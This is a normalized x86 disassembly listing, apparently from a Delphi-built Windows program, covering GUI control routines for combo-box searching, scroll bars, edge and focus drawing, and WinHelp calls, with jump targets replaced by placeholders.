lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_4043cc
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_4043cc
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_4041b8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_4339a0
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_4067ec
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_433970
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f00
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42cb74
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_404094
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_4041b8
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_42cb74
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_42cb74
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42cd29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40416c
test eax eax
jne r-xdata
mov eax esi
call sub_40436c
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_4032ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd30
lea eax [ ebp - 0x1c ]
call sub_403eac
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403ed0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403f00
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_40416c
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_4043cc
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4041b8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_4339a0
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_433970
mov eax [ ebp - 0x1c ]
call sub_40416c
push eax
mov eax esi
call sub_40416c
pop edx
call sub_4067ec
push eax
push 0x0
push 0x142
mov eax ebx
call sub_43a170
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_4032ec
mov eax ebx
mov si 0xffb2
call sub_4032ec
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_42cd5c
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_41db5c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_41d9fc
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_41da18
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_41d6c8
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d324
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cb58
xor edx edx
mov eax [ esi + 0x208 ]
call sub_41db5c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_42ce34
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_42ce60
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_43500c
mov eax ebx
call sub_433b98
test al al
je r-xdata
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44a5dc
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_434030
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_433ba8
sub_42ced8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_42bccc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41d358
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42cf34
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_438300
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d15d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43254c
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d324
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d704
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d704
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_433310
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41d324
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d704
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41d704
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_42b6e0
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawFrameControl
jmp r-xdata
sub_42d170
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_435e9c
mov edx 0x79
mov eax esi
call sub_43312c
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_433150
mov dl 0x1
mov eax esi
call sub_43a3a4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_42d228
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_436ffc
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_436f28
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_42d368
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_4032ec
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42d2b8
call sub_433310
mov eax ebx
call sub_437128
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_433330
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollInfo
mov eax ebx
call sub_42d368
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_42d368
push ebx
mov ebx eax
mov eax ebx
call sub_433fb4
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_42d388
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_437710
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_42d3c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42d4fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_43a474
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d502
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_43a474
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_4032ec
mov eax ebx
call sub_42d368
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollPos
jmp r-xdata
sub_42d520
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_43a474
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call SetScrollInfo
sub_42d5e8
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_42d60d ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43a170
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_42d368
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_4032ec
mov edx [ esp ]
mov eax ebx
call sub_42d50c
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_42d710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43a170
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_42d740
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d765
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d76c
retn
sub_42d86c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fed4
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_42d8a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d8cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d8d4
retn
sub_42da8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42db41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eac
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f44
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db48
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40422c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42db5c
push ebx
mov ebx eax
mov eax ebx
call sub_42de8c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4054e8
sub_42db98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42dbff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42da8c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc06
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_42dc10
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42dc98
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_42db84
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40422c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc9f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
sub_42dcab
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42dd33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42e3d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dd3a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42da8c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42dd40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42de38
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_42da8c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408940
mov eax ebx
call sub_42e3d0
test al al
je r-xdata
mov ecx sub_42d8e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de3f
lea eax [ ebp - 0x1c ]
call sub_403eac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_42da8c
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_42e328
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f00
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40436c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42ded8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42df30
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42df37
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42da8c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_42df40
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e036
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408900
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42da8c
mov eax ebx
call sub_42e3d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e03d
lea eax [ ebp - 0x110 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40411c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_42e328
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40411c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42e054
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42e0b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e0bd
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42da8c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_42e0c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e148
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42da8c
mov eax ebx
call sub_42e3d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
